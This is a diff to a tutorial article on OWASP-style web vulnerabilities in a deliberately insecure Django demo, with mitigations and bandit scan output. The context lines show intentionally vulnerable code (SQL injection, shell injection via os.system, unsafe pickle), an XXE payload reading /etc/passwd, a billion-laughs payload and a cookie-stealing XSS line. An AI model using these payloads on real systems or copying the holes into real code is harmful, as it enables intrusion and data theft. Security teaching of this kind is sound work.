@@ -13,7 +13,7 @@ This is based on some of the OWASP's resources such as [1] and [2]. The example 
 
 To run the application, get it from github and run
 
-```
+```bash
 cd insecure
 python manage.py runserver
 ```
@@ -34,7 +34,7 @@ Consider the following code from the example Django application [3].
 
 Unsafe query where SQL injection is possible:
 
-```
+```python
 user = User.objects.raw(f'SELECT * FROM security_user WHERE id = {user_id}')
 ```
 
@@ -42,7 +42,7 @@ This doesn't use a parameterised query and instead uses whatever an application 
 
 An unsafe call to return a user with `user_id` = 1:
 
-```
+```bash
 http://127.0.0.1:8000/security/unsafe/users/1
 ```
 
@@ -62,13 +62,13 @@ In that way, users data can be exploited. If the same could be applied to `UPDAT
 
 In order to prevent SQL injection, one can use parameterised query which doesn't concatenate query and argument strings in Python.
 
-```
+```python
 user = User.objects.raw('SELECT * FROM security_user WHERE id = %s', (user_id,))
 ```
 
 Or use ORM:
 
-```
+```python
 user = User.objects.get(id=user_id)
 ```
 
@@ -84,7 +84,7 @@ http://127.0.0.1:8000/security/files/read/manage.py
 
 will print Django's `manage.py` using the following code.
 
-```
+```python
 def read_file(request, filename):
     with open(filename) as f:
         return HttpResponse(f.read())
@@ -96,7 +96,7 @@ Even worse, it can lead to data loss.
 
 Consider this example that tries to copy a file using shell's `cp` command. It passes `filename` argument directly to be executed by shell using `os.system`.
 
-```
+```python
 def copy_file(request, filename):
     cmd = f'cp {filename} new_{filename}'
     os.system(cmd)
@@ -134,17 +134,17 @@ Many applications store a lot of sensitive data about their users, potentially d
 
 Ideally, applications store as little sensitive data about users as possible. If the data is required, it should be securely stored (encrypted). Handling sensitive data is tricky and can easily leak e.g. by caching user profiles or logging. For example, consider a user profile:
 
-```
+```python
 class User:
 	# ...
 	def __str__(self):
-		Return f’{self.name} {self.email} {self.phone}’
+		return f'{self.name} {self.email} {self.phone}'
 ```
 
 At some point, an application might want to log a user action:
 
-```
-logger.info(‘User %s created a record’, user)
+```python
+logger.info('User %s created a record', user)
 ```
 
 which would cause user's name, email, and phone number to be recorded in logs (which could be stored insecurely for a long time). Instead, only something like an ID should be logged.
@@ -156,7 +156,8 @@ Unsafe password storage mechanisms mentioned before and not enforcing HTTPS coul
 Common especially in older, poorly designed or misconfigured applications that use XML and accept XML as input. They can potentially be tricked into accepting dangerous content. The problem is related to the use of external entities definitions in XML (DTDs) which should be disabled in libraries parsing XML. Misconfiguration and use of buggy/outdated libraries can also contribute to the problem. Validation and whitelisting user input is also encouraged.
 
 Example which could allow an attacker to read system file storing sensitive data (`/etc/passwd`).
-```
+
+```xml
  <?xml version="1.0" encoding="ISO-8859-1"?>
   <!DOCTYPE foo [
     <!ELEMENT foo ANY >
@@ -165,7 +166,7 @@ Example which could allow an attacker to read system file storing sensitive data
 
 A problem related to XML's entities can also cause a denial of service attack. It can also affect other formats that use references to other objects (like YAML). An attack called "billion laughs attack", shown below, exploits XML's entities that expand `log9` into a large amount of data that could not fit into memory and crash the application. In an example below, `lol9` will expand into ten `lol8`s which in turn will expand into ten `lol7`s and so on.
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE lolz [
  <!ENTITY lol "lol">
@@ -253,7 +254,7 @@ will send user's cookies to a potentially different website. In this case it goe
 
 A more readable version:
 
-```
+```javascript
 <script>new Image().src="http://127.0.0.1:8000/security/log?string=".concat(document.cookie)</script>
 ```
 
@@ -268,7 +269,7 @@ To help mitigate the risks, if possible, data should only be accepted from known
 
 As an example, consider a simple class representing a user:
 
-```
+```python
 @dataclass
 class TestUser:
     perms: int = 0
@@ -278,7 +279,7 @@ Field `perms` can be understood as access level a user has, `0` for ordinary use
 
 The request handler, presented below, decodes a token encoded using `base64` and then tries to "unpickle" it using Python's `pickle` module from the standard library. The intention is to transfer the data stored in a token into an instance of `TestUser` class. Then, `perms` field is checked and different output is shown depending on whether the application thinks it's dealing with an administrator or not.
 
-```
+```python
 def admin_index(request):
     token = base64.b64decode(request.COOKIES.get('silly_token', ''))
     user = pickle.loads(token)
@@ -333,7 +334,7 @@ In case of Python, there's `bandit` [5] project which can automatically find man
 
 To run it on the example Django application, execute:
 
-```
+```bash
 bandit -r ./insecure/security
 ```
 
@@ -341,7 +342,7 @@ This will print a number of messages, along with corresponding code. Some of the
 
 For instance, it warns of a "possible SQL injection" where it indeed can occur.
 
-```
+```python
 >> Issue: [B608:hardcoded_sql_expressions] Possible SQL injection vector through string-based query construction.
    Severity: Medium   Confidence: Low
    Location: insecure/security/views.py:13
@@ -352,7 +353,7 @@ For instance, it warns of a "possible SQL injection" where it indeed can occur.
 
 It also does warn about use of `pickle` module and how unsafe it can be.
 
-```
+```python
 >> Issue: [B301:blacklist] Pickle and modules that wrap it can be unsafe when used to deserialize untrusted data, possible security issue.
    Severity: Medium   Confidence: High
    Location: insecure/security/views.py:51
@@ -366,7 +367,6 @@ It also does warn about use of `pickle` module and how unsafe it can be.
 This article presented a number of common security concerns that can occur in web applications. Due to how widespread and serious can they be, it's necessary to be aware of risks and how to mitigate them.
 
 ## Footnotes
-
 
 [1] https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf
 
